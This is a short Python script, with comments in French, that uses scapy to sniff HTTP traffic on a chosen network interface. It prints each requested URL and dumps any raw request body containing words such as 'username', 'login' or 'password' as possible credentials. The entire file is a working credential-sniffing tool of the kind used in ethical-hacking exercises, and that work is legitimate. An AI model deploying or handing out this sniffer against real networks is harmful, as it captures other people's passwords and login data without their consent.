#!/usr/bin/env python
import scapy.all as scapy
from scapy.layers import http
import argparse


def get_arguments():
    # Configuration du parser d'arguments
    parser = argparse.ArgumentParser(description="HTTP Sniffer - Analysez le trafic HTTP sur une interface réseau.")
    parser.add_argument(
        "-i", "--interface",
        dest="interface",
        help="Spécifiez l'interface réseau à sniffer (ex : eth0, wlan0).",
        required=True
    )
    return parser.parse_args()


def sniff(interface):
    print(f"[INFO] Sniffing en cours sur l'interface {interface}...")
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)


def process_sniffed_packet(packet):
    # Vérifie si le paquet contient une requête HTTP
    if packet.haslayer(http.HTTPRequest):
        url = packet[http.HTTPRequest].Host.decode() + packet[http.HTTPRequest].Path.decode()
        print(f"\n[URL détectée] {url}")

        # Vérifie si le paquet contient des données brutes (Raw Layer)
        if packet.haslayer(scapy.Raw):
            load = packet[scapy.Raw].load.decode(errors="ignore")
            keywords = ["username", "user", "login", "password", "pass"]
            for keyword in keywords:
                if keyword in load:
                    print(f"\n[Possible Credentials] {load}")
                    break


# Récupération des arguments de la ligne de commande
options = get_arguments()

# Exécution du sniffer sur l'interface spécifiée
sniff(options.interface)
